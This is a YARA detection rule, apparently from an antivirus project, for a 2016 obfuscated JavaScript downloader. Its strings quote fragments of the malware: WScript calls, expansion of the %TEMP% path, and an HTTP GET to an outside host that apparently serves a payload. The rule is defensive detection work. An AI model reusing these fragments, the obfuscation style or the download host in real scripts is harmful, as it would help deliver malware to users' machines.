rule sig_20160428_163c78062c9cd8fb43c27bcf6e9b4b9c {
  meta:
    description = "datamaliciousorder - file 20160428_163c78062c9cd8fb43c27bcf6e9b4b9c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cfea8a763ebf69426a5c9b2828aa5d1ea2095f2486a66402221d3bb55320f30f"

  strings:
    $s1  = "function ZsfXzyPrpRxmDgkUkkCnq(LybRmtKxtBcpYqzBcjJen, CzbMgrFnmFkiXukSgnBkz){LirAipYujVwrLjcJdrZau = LirAipYujVwrLjcJdrZau * 1; " ascii
    $s2  = "return LybRmtKxtBcpYqzBcjJen - CzbMgrFnmFkiXukSgnBkz;};" fullword ascii
    $s3  = "CmbXilXjhQtgUvzFdkXzl[NixShlRkfLuhPfoSraAxm](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s4  = "function XroGsmHzrJziUtcVczXhp(UmoCbeDgxHnyBpqZcjIgn){AmaOkqYtiJqvOplFcaXwu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function XroGsmHzrJziUtcVczXhp(UmoCbeDgxHnyBpqZcjIgn){AmaOkqYtiJqvOplFcaXwu[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s6  = "function RybGnmXwlRozRvbQnoZwp() {return AmaOkqYtiJqvOplFcaXwu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s7  = "if (CmbXilXjhQtgUvzFdkXzl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function ZsfXzyPrpRxmDgkUkkCnq(LybRmtKxtBcpYqzBcjJen, CzbMgrFnmFkiXukSgnBkz){LirAipYujVwrLjcJdrZau = LirAipYujVwrLjcJdrZau * 1; " ascii
    $s9  = "var AmaOkqYtiJqvOplFcaXwu = function MikCrbZglRkjChgAndWra() {return IdvXjgCabByuQfdGhuDpv[GbbZoiEguZccHteVihCzy](\"WScript\"+\"" ascii
    $s10 = "function QufFbdWszPwqIwoNpxMqe(){return QmkNnhGyuDxvVgvEntVgo + \"\";};" fullword ascii
    $s11 = "function IcjWzhJimCzfOmiRhcXdb() {return ((ZrkDbeRykUtrFfcSbzEcj == true) && (ZrkDbeRykUtrFfcSbzEcj == LplQglPtlFcjDocIqnEvs)) ?" ascii
    $s12 = "function IcjWzhJimCzfOmiRhcXdb() {return ((ZrkDbeRykUtrFfcSbzEcj == true) && (ZrkDbeRykUtrFfcSbzEcj == LplQglPtlFcjDocIqnEvs)) ?" ascii
    $s13 = "var IdvXjgCabByuQfdGhuDpv = this[\"WScript\"];" fullword ascii
    $s14 = "var AmaOkqYtiJqvOplFcaXwu = function MikCrbZglRkjChgAndWra() {return IdvXjgCabByuQfdGhuDpv[GbbZoiEguZccHteVihCzy](\"WScript\"+\"" ascii
    $s15 = "function RybGnmXwlRozRvbQnoZwp() {return AmaOkqYtiJqvOplFcaXwu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s16 = "var NwbUbkGqfLcnEzmKdtXuq = false;" fullword ascii
    $s17 = "LplQglPtlFcjDocIqnEvs = true; " fullword ascii
    $s18 = "function SqaUewApxSsfLybQwdIos(){return GbbZoiEguZccHteVihCzy;};" fullword ascii
    $s19 = "function VflXjvJpyUucBcbNahIdf()" fullword ascii
    $s20 = "}while (SsgTlbLpbRasVslLaqKmq);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}